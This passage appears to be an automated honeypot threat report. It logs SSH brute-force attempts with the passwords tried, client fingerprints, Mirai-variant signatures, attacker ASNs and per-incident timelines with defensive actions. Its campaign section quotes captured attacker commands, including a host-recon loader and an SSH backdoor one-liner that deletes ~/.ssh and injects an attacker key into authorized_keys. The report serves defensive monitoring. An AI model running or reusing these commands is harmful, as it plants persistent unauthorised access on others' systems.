| `root` | `3245gs5662d34` | `103.146.159.173` | 2026-08-09T11:45:57 |
| `root` | `1qaz2wsx` | `2.57.122.209` | 2026-08-09T11:46:19 |
| `root` | `admin!01` | `10.0.0.73` | 2026-08-09T11:46:44 |
| `root` | `!qaz@WSX` | `10.0.0.73` | 2026-08-09T11:47:27 |
| `root` | `pass@word!` | `10.0.0.73` | 2026-08-09T11:47:42 |
| `root` | `zxcv123456` | `10.0.0.73` | 2026-08-09T11:48:00 |
| `root` | `!@#$zxcv` | `10.0.0.73` | 2026-08-09T11:48:15 |
| `root` | `ZXCV1234` | `10.0.0.73` | 2026-08-09T11:49:06 |
| `root` | `1qaz@WSX` | `2.57.122.209` | 2026-08-09T11:49:21 |
| `root` | `root12345!` | `10.0.0.73` | 2026-08-09T11:49:24 |
| `root` | `xxx@123` | `10.0.0.73` | 2026-08-09T11:51:43 |
| `admin` | `webmaster` | `10.0.0.73` | 2026-08-09T11:53:39 |
| `admin` | `webmaster` | `221.120.57.125` | 2026-08-09T11:55:03 |
| `root` | `3EDCvfr4` | `10.0.0.73` | 2026-08-09T11:55:05 |
| `admin` | `webmaster` | `41.220.3.101` | 2026-08-09T11:55:16 |
| `root` | `Password9` | `10.0.0.73` | 2026-08-09T11:55:29 |
| `root` | `!qazxsw@#edc` | `10.0.0.73` | 2026-08-09T11:55:50 |
| `root` | `qaz520wsx` | `10.0.0.73` | 2026-08-09T11:56:22 |
| `root` | `D3skt0p` | `10.0.0.73` | 2026-08-09T11:56:41 |
| `root` | `1q@w3e` | `10.0.0.73` | 2026-08-09T11:56:56 |
| `root` | `P@55@word1` | `10.0.0.73` | 2026-08-09T11:57:33 |
| `root` | `@WSX@ZAQ!` | `10.0.0.73` | 2026-08-09T11:59:06 |
| `root` | `Hello123!` | `10.0.0.73` | 2026-08-09T11:59:31 |
| `root` | `aBc@123` | `10.0.0.73` | 2026-08-09T12:01:42 |
| `root` | `asd123456@` | `10.0.0.73` | 2026-08-09T12:02:20 |
| `root` | `123qaz!@#$%^` | `10.0.0.73` | 2026-08-09T12:02:27 |
| `root` | `Adm1n` | `10.0.0.73` | 2026-08-09T12:02:47 |
| `router` | `router` | `10.0.0.73` | 2026-08-09T12:04:14 |
| `root` | `2wsx3edc` | `10.0.0.73` | 2026-08-09T12:05:04 |
| `root` | `P@ssw0rd04` | `10.0.0.73` | 2026-08-09T12:05:48 |
| `supervisor` | `supervisor123456789` | `10.0.0.73` | 2026-08-09T12:07:13 |
| `root` | `ABab1234` | `10.0.0.73` | 2026-08-09T12:07:19 |
| `root` | `ABab123` | `10.0.0.73` | 2026-08-09T12:07:26 |
| `root` | `1Qaz2Wsx#edc` | `10.0.0.73` | 2026-08-09T12:08:17 |
| `root` | `Password7` | `10.0.0.73` | 2026-08-09T12:08:39 |
| `root` | `Password888` | `10.0.0.73` | 2026-08-09T12:09:05 |
| `root` | `P@ssw0rd8` | `10.0.0.73` | 2026-08-09T12:09:10 |
| `root` | `1QAZ2wsx#edc` | `10.0.0.73` | 2026-08-09T12:09:30 |
| `root` | `1q@W3e$R5t` | `10.0.0.73` | 2026-08-09T12:10:41 |
| `root` | `2wsx#EDC4rfv` | `10.0.0.73` | 2026-08-09T12:10:42 |
| `root` | `1Qaz2Wsx3edc` | `10.0.0.73` | 2026-08-09T12:11:28 |
| `root` | `1Qaz2WSX3edc` | `10.0.0.73` | 2026-08-09T12:11:38 |
| `admin` | `webmaster` | `196.190.41.137` | 2026-08-09T12:11:48 |
| `root` | `ww123456789` | `10.0.0.73` | 2026-08-09T12:12:08 |
| `root` | `Pass!23` | `10.0.0.73` | 2026-08-09T12:13:20 |
| `root` | `1234@admin` | `10.0.0.73` | 2026-08-09T12:13:51 |
| `root` | `%TGB6yhn` | `10.0.0.73` | 2026-08-09T12:15:10 |
| `root` | `jy123.` | `10.0.0.73` | 2026-08-09T12:15:37 |
| `root` | `!1qaz2wsx` | `10.0.0.73` | 2026-08-09T12:17:01 |
| `root` | `1q!Q2w@` | `10.0.0.73` | 2026-08-09T12:17:35 |
| `root` | `jingke@123` | `10.0.0.73` | 2026-08-09T12:17:45 |
| `root` | `aa!123456` | `10.0.0.73` | 2026-08-09T12:17:59 |
| `root` | `Qcx135246.` | `10.0.0.73` | 2026-08-09T12:19:46 |
| `router` | `router` | `212.73.75.82` | 2026-08-09T12:23:25 |
| `router` | `router` | `192.34.128.202` | 2026-08-09T12:23:31 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-09T12:27:57 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-09T12:27:57 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-09T12:28:06 |
| `user` | `123456a` | `178.178.194.137` | 2026-08-09T12:30:04 |
| `root` | `Qaz!@#Qaz` | `10.0.0.73` | 2026-08-09T12:40:56 |
| `root` | `Qwer!@#ty123456` | `10.0.0.73` | 2026-08-09T12:41:08 |
| `root` | `12345@Admin` | `10.0.0.73` | 2026-08-09T12:42:00 |
| `user` | `123456a` | `10.0.0.73` | 2026-08-09T12:42:01 |
| `root` | `pass321` | `10.0.0.73` | 2026-08-09T12:42:34 |
| `root` | `Pass.321` | `10.0.0.73` | 2026-08-09T12:42:43 |
| `root` | `pass.1234` | `10.0.0.73` | 2026-08-09T12:42:49 |
| `root` | `sa123!@#` | `10.0.0.73` | 2026-08-09T12:43:51 |
| `root` | `zy123` | `10.0.0.73` | 2026-08-09T12:44:19 |
| `root` | `!QAZ@WSX#EDC` | `10.0.0.73` | 2026-08-09T12:45:00 |
| `root` | `Support@1` | `10.0.0.73` | 2026-08-09T12:45:32 |
| `root` | `zaq1XSW@` | `10.0.0.73` | 2026-08-09T12:45:47 |
| `root` | `Password-123` | `10.0.0.73` | 2026-08-09T12:46:01 |
| `root` | `admin_12345` | `10.0.0.73` | 2026-08-09T12:46:10 |
| `root` | `123456qq` | `10.0.0.73` | 2026-08-09T12:46:16 |
| `root` | `P@ssw0rd07` | `10.0.0.73` | 2026-08-09T12:46:28 |
| `root` | `insecure` | `80.233.12.109` | 2026-08-09T12:46:45 |
| `root` | `insecure` | `118.163.145.175` | 2026-08-09T12:46:54 |
| `root` | `P@$$word!` | `10.0.0.73` | 2026-08-09T12:47:02 |
| `root` | `a_123456` | `10.0.0.73` | 2026-08-09T12:47:47 |
| `root` | `@abc123` | `10.0.0.73` | 2026-08-09T12:49:01 |
| `root` | `gm@123` | `10.0.0.73` | 2026-08-09T12:49:31 |
| `root` | `A-1234567` | `10.0.0.73` | 2026-08-09T12:50:19 |
| `root` | `Asdf12#$` | `10.0.0.73` | 2026-08-09T12:50:58 |
| `root` | `aA1!` | `10.0.0.73` | 2026-08-09T12:51:18 |
| `root` | `ABcd@1234` | `10.0.0.73` | 2026-08-09T12:52:08 |
| `root` | `Abc*123456` | `10.0.0.73` | 2026-08-09T12:52:28 |
| `root` | `ABC@abc123` | `10.0.0.73` | 2026-08-09T12:53:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **402** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 41 |
| libssh | 37 |
| Go SSH scanner | 29 |
| AsyncSSH (Python) | 22 |
| Nmap scanner | 14 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 36 | 36 |
| `fda360b1b4f4...` | Mirai/variant | 22 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 19 | 1 |
| `e788c657d1a2...` | Mirai/variant | 12 | 1 |
| `f555226df196...` | Mirai/variant | 12 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 36 | 36 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 22 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 21 | 7 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 19 | 1 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 12 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 11 | 3 | Mirai/variant |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 18 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `51.77.158.34`, `115.178.75.243`, `102.140.97.134`, `103.146.159.173`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **139** |
| Unique ASNs | **101** |
| High-Risk ASNs | **75** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 9 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS133119` | China Unicom IP network | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS24086` | Viettel Corporation | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (132)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-059a881b69b5

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-08-09 08:55 |
| **Last Seen** | 2026-08-09 08:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 08:55:03` | `cowrie.login.success` |
| `2026-08-09 08:55:04` | `cowrie.direct-tcpip.request` |
| `2026-08-09 08:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8157746603e2

| Field | Detail |
|---|---|
| **Source IP** | `202.138.229[.]190` |
| **First Seen** | 2026-08-09 08:55 |
| **Last Seen** | 2026-08-09 08:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 08:55:15` | `cowrie.session.connect` |
| `2026-08-09 08:55:16` | `cowrie.client.version` |
| `2026-08-09 08:55:16` | `cowrie.client.kex` |
| `2026-08-09 08:55:18` | `cowrie.login.success` |
| `2026-08-09 08:55:19` | `cowrie.direct-tcpip.request` |
| `2026-08-09 08:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.138.229[.]190` to AbuseIPDB if not already reported
- [ ] Block `202.138.229[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f04c27b9d2cd

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-08-09 08:57 |
| **Last Seen** | 2026-08-09 08:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 08:57:27` | `cowrie.session.connect` |
| `2026-08-09 08:57:27` | `cowrie.client.version` |
| `2026-08-09 08:57:28` | `cowrie.client.kex` |
| `2026-08-09 08:57:30` | `cowrie.login.success` |
| `2026-08-09 08:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65ce2e99c8d2

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-09 08:57 |
| **Last Seen** | 2026-08-09 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 08:57:30` | `cowrie.session.connect` |
| `2026-08-09 08:57:30` | `cowrie.client.version` |
| `2026-08-09 08:57:30` | `cowrie.client.kex` |
| `2026-08-09 08:57:30` | `cowrie.login.success` |
| `2026-08-09 08:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4c7759ef705

| Field | Detail |
|---|---|
| **Source IP** | `218.59.235[.]170` |
| **First Seen** | 2026-08-09 09:02 |
| **Last Seen** | 2026-08-09 09:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:02:15` | `cowrie.session.connect` |
| `2026-08-09 09:02:16` | `cowrie.client.version` |
| `2026-08-09 09:02:16` | `cowrie.client.kex` |
| `2026-08-09 09:02:18` | `cowrie.login.success` |
| `2026-08-09 09:02:19` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.59.235[.]170` to AbuseIPDB if not already reported
- [ ] Block `218.59.235[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea379bc04df5

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
| **First Seen** | 2026-08-09 09:02 |
| **Last Seen** | 2026-08-09 09:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:02:29` | `cowrie.session.connect` |
| `2026-08-09 09:02:29` | `cowrie.client.version` |
| `2026-08-09 09:02:29` | `cowrie.client.kex` |
| `2026-08-09 09:02:32` | `cowrie.login.success` |
| `2026-08-09 09:02:32` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e5fb2d7b49d

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-09 09:14 |
| **Last Seen** | 2026-08-09 09:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:14:55` | `cowrie.session.connect` |
| `2026-08-09 09:14:55` | `cowrie.client.version` |
| `2026-08-09 09:14:55` | `cowrie.client.kex` |
| `2026-08-09 09:14:56` | `cowrie.login.success` |
| `2026-08-09 09:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df02cd81d3cc

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-09 09:14 |
| **Last Seen** | 2026-08-09 09:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:14:57` | `cowrie.session.connect` |
| `2026-08-09 09:14:57` | `cowrie.client.version` |
| `2026-08-09 09:14:57` | `cowrie.client.kex` |
| `2026-08-09 09:14:58` | `cowrie.login.success` |
| `2026-08-09 09:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3026082477ff

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-09 09:14 |
| **Last Seen** | 2026-08-09 09:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:14:59` | `cowrie.session.connect` |
| `2026-08-09 09:14:59` | `cowrie.client.version` |
| `2026-08-09 09:14:59` | `cowrie.client.kex` |
| `2026-08-09 09:15:00` | `cowrie.login.success` |
| `2026-08-09 09:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17eae52d7697

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-08-09 09:29 |
| **Last Seen** | 2026-08-09 09:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:29:57` | `cowrie.session.connect` |
| `2026-08-09 09:29:58` | `cowrie.client.version` |
| `2026-08-09 09:29:58` | `cowrie.client.kex` |
| `2026-08-09 09:30:00` | `cowrie.login.success` |
| `2026-08-09 09:30:00` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef058fed29a

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-08-09 09:31 |
| **Last Seen** | 2026-08-09 09:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:31:33` | `cowrie.session.connect` |
| `2026-08-09 09:31:33` | `cowrie.client.version` |
| `2026-08-09 09:31:33` | `cowrie.client.kex` |
| `2026-08-09 09:31:34` | `cowrie.login.success` |
| `2026-08-09 09:31:35` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9145e24501e8

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-09 09:31 |
| **Last Seen** | 2026-08-09 09:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:31:44` | `cowrie.session.connect` |
| `2026-08-09 09:31:45` | `cowrie.client.version` |
| `2026-08-09 09:31:45` | `cowrie.client.kex` |
| `2026-08-09 09:31:47` | `cowrie.login.success` |
| `2026-08-09 09:31:48` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-086b2893cd37

| Field | Detail |
|---|---|
| **Source IP** | `196.203.231[.]220` |
| **First Seen** | 2026-08-09 09:36 |
| **Last Seen** | 2026-08-09 09:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:36:19` | `cowrie.session.connect` |
| `2026-08-09 09:36:19` | `cowrie.client.version` |
| `2026-08-09 09:36:19` | `cowrie.client.kex` |
| `2026-08-09 09:36:20` | `cowrie.login.success` |
| `2026-08-09 09:36:21` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.203.231[.]220` to AbuseIPDB if not already reported
- [ ] Block `196.203.231[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acf3f6c1c1b2

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
| **First Seen** | 2026-08-09 09:36 |
| **Last Seen** | 2026-08-09 09:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:36:26` | `cowrie.session.connect` |
| `2026-08-09 09:36:26` | `cowrie.client.version` |
| `2026-08-09 09:36:26` | `cowrie.client.kex` |
| `2026-08-09 09:36:28` | `cowrie.login.success` |
| `2026-08-09 09:36:29` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0965f3738c19

| Field | Detail |
|---|---|
| **Source IP** | `116.110.215[.]21` |
| **First Seen** | 2026-08-09 09:56 |
| **Last Seen** | 2026-08-09 09:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:56:07` | `cowrie.session.connect` |
| `2026-08-09 09:56:07` | `cowrie.client.version` |
| `2026-08-09 09:56:07` | `cowrie.client.kex` |
| `2026-08-09 09:56:08` | `cowrie.login.success` |
| `2026-08-09 09:56:09` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:56:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 09:56:09` | `cowrie.direct-tcpip.data` |
| `2026-08-09 09:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.215[.]21` to AbuseIPDB if not already reported
- [ ] Block `116.110.215[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d8eb92cc966

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]175` |
| **First Seen** | 2026-08-09 09:58 |
| **Last Seen** | 2026-08-09 09:58 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 09:58:32` | `cowrie.session.connect` |
| `2026-08-09 09:58:32` | `cowrie.client.version` |
| `2026-08-09 09:58:32` | `cowrie.client.kex` |
| `2026-08-09 09:58:39` | `cowrie.login.success` |
| `2026-08-09 09:58:39` | `cowrie.direct-tcpip.request` |
| `2026-08-09 09:58:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 09:58:49` | `cowrie.direct-tcpip.data` |
| `2026-08-09 09:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5194cd7dbff5

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]175` |
| **First Seen** | 2026-08-09 10:00 |
| **Last Seen** | 2026-08-09 10:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
